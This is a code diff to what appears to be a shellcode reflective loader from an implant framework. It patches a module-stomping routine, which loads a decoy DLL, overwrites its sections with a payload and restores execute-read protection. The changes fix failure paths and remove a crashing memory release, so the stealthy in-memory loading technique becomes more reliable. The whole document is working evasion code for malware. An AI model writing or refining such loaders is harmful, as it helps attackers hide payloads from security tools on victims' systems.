@@ -99,8 +99,16 @@ SEC( text, B ) VOID Entry( VOID )
         StompName.Buffer        = gStompTarget;
         StompName.Length        = StompNameLen * sizeof( WCHAR );
         StompName.MaximumLength = ( USHORT )( STOMP_TARGET_LEN ) * sizeof( WCHAR );
+
+        // explicitly clear StompBase: if both LdrGetDllHandle and LdrLoadDll
+        // fail, StompBase must be NULL so we don't deref a garbage pointer
+        StompBase = NULL;
         if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
-            Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase );
+        {
+            StompBase = NULL;
+            if ( ! NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase ) ) )
+                StompBase = NULL;
+        }
 
         if ( StompBase )
         {
@@ -137,8 +145,9 @@ SEC( text, B ) VOID Entry( VOID )
                 SecMemory     = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress );
                 SecMemorySize = SecHeader[ i ].SizeOfRawData;
 
-                if ( ! NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READWRITE, &OldProtection ) ) )
-                    continue;
+                // if protect fails, still attempt the copy — the pages may
+                // already be writable, and skipping the copy leaves garbage
+                Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READWRITE, &OldProtection );
             }
 
             MemCopy(
@@ -187,17 +196,12 @@ SEC( text, B ) VOID Entry( VOID )
             Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
         }
 
-        // when stomping: trim the decoy's trailing pages and restore RX over the image
+        // when stomping: restore RX over the image (skip the dangerous tail-free:
+        // NtFreeVirtualMemory MEM_RELEASE requires RegionSize=0 and the allocation
+        // base, which we don't have for a loaded DLL — partial release of a
+        // module mapping is invalid and would crash)
         if ( gStompEnabled == 1 )
         {
-            // free the decoy's tail: from end-of-image to end-of-module
-            if ( StompSize > NtHeaders->OptionalHeader.SizeOfImage )
-            {
-                PVOID freeBase = C_PTR( ( ULONG_PTR ) KVirtualMemory + NtHeaders->OptionalHeader.SizeOfImage );
-                SIZE_T freeSize = StompSize - NtHeaders->OptionalHeader.SizeOfImage;
-                Instance.Win32.NtFreeVirtualMemory( NtCurrentProcess(), &freeBase, &freeSize, MEM_RELEASE );
-            }
-
             SecMemory     = KVirtualMemory;
             SecMemorySize = NtHeaders->OptionalHeader.SizeOfImage;
             Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_EXECUTE_READ, &OldProtection );
